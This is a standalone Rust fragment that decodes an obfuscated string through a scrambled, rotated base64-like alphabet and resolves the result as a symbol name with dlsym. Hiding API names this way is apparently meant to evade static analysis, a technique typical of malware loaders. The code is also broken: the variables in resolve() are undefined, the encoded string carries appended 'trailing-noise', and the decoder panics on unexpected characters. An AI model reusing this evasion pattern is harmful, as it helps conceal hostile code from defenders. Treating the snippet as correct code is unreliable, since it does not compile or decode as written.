const TABLE: [u8; 64] = [0x37, 0x21, 0x7d, 0x57, 0x34, 0x77, 0x30, 0x6a, 0x75, 0x36, 0x43, 0x3c, 0x6c, 0x62, 0x69, 0x76, 0x72, 0x5e, 0x5a, 0x65, 0x6d, 0x23, 0x2d, 0x63, 0x45, 0x3a, 0x35, 0x73, 0x48, 0x64, 0x24, 0x49, 0x38, 0x2a, 0x39, 0x40, 0x4a, 0x78, 0x51, 0x44, 0x7a, 0x52, 0x66, 0x4c, 0x70, 0x7e, 0x5f, 0x41, 0x29, 0x67, 0x3b, 0x68, 0x55, 0x46, 0x3f, 0x2e, 0x47, 0x5b, 0x4e, 0x6f, 0x50, 0x58, 0x7b, 0x71];

fn decode(encoded: &str, key: usize, length: usize) -> Vec<u8> {
    let mut remapped = [0u8; 64];
    for slot in 0..64 {
        remapped[slot] = TABLE[(slot + key) % 64];
    }
    let values: Vec<u8> = encoded.bytes().take((length * 8 + 5) / 6)
        .map(|c| remapped.iter().position(|&x| x == c).unwrap() as u8).collect();
    let mut out = Vec::new();
    for q in values.chunks(4) {
        let a = q[0]; let b = q[1];
        out.push((a << 2) | (b >> 4));
        if q.len() > 2 {
            let c = q[2];
            out.push((b << 4) | (c >> 2));
            if q.len() > 3 { out.push((c << 6) | q[3]); }
        }
    }
    out.truncate(length);
    out.push(0);
    out
}
unsafe fn resolve() {
    let module = std::ptr::null_mut();
    let name = decode("vUe;eJofsmh@rm.J:FjL-#vD:U.#trailing-noise", key, length);
    let _address = libc::dlsym(module, name.as_ptr());
}
